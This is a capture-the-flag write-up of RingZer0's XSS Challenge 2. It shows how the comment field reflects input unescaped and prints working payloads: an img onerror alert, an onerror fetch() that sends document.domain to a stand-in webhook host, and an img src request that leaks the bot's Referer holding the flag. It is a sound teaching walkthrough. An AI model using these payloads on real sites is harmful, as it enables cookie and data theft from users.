# XSS Challenge 2 Solutions

The first payload I tried with is 
```
abcd"<'`
```
and viewing the page source for the response is the following:
```html
<!DOCTYPE html>
<html>
<head>
  <title>RingZer0 Team Online CTF Challenge</title>
  <link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
  <header></header>
  <div class="padding"><img src="/imgs/logo.png" /></div>
  <section>
      <br />
      <br />
      Your opinion matters to us! Write some feedback.<br /><br />
      <form action="" method="post">
          Comment<br />
          <textarea name="comment"></textarea><br />
          <input type="submit" value="submit" />
      </form>
  <br />abcd\"<\'`<br /><br />
  </section>
  <div class="pre_footer"></div>
  <footer>RingZer0 Team 2022</footer>
</body>
</html>
```

Essentially, this is how my payload was reflected in the document:
```html
<br />abcd\"<\'`<br /><br />
```
The single and double quotation marks seem to have been escaped but the `<` and the `` ` `` characters were not.  

Because the `<` was not escaped, the next payload I tried was the following:
```html
<img src=x onerror=alert(1)>
```
I was able to get an XSS working with the above payload on my browser so it was time to craft a payload to send a request to my webhook listener (I used Burp Collaborator).
```html
<img src=x onerror=fetch(`http://mywebhooklistener.com?q=${document.domain}`)>
```

I received a request from my own browser, but nothing from the XSS bot.

Then I started thinking about why and one guess was that maybe the XSS bot is old and so the Fetch API and backticks may not be supported. I also checked `caniuse` for the Fetch API and backticks (links [here](https://caniuse.com/fetch) and [here](https://caniuse.com/template-literals)) and it looks like there are a lot of old browsers that don't support these. 

So I started to look at something simpler. All I needed was a request to my webhook listner so I used the following payload:

```html
<img src=http://mywebhooklistener.com>
```
and received one request from my browser and one from the XSS Bot:

```
GET / HTTP/1.1
Referer: http://127.0.0.1/xss2/bot_endpoint_qQ134dJO8J.php?FLAG-[CENSORED]
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: mywebhooklistener.com
```

Found the flag! :)

Also an interesting note, looks like the user agent is `PhantomJS/2.1.1`.